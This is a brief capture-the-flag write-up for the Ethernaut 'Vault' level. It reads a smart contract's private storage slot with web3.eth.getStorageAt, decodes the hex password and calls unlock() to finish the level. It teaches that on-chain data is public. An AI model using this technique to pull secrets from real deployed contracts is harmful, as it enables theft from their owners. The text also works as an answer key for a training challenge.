## Ethernaut 
### Vault [Contracts](./08-Vault/Vault.sol)

While remembering that everything on the blockchain is public, we are able to retrieve storage areas of the contract.

In the console:
- web3.eth.getStorageAt(instance, 1);
Returns
- "0x412076657279207374726f6e67207365637265742070617373776f7264203a29"
- Utilising [https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')](CyberChef) to convert to ASCII the password is "A very strong secret password :)"
Call the unlock() function with the hex as a string
- contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")

Once we have unlocked the contract the challenge is complete, click the "Submit Instance" button and approve that transaction to complete the level.

✌(◕‿-)✌ Well done, You have completed this level!!!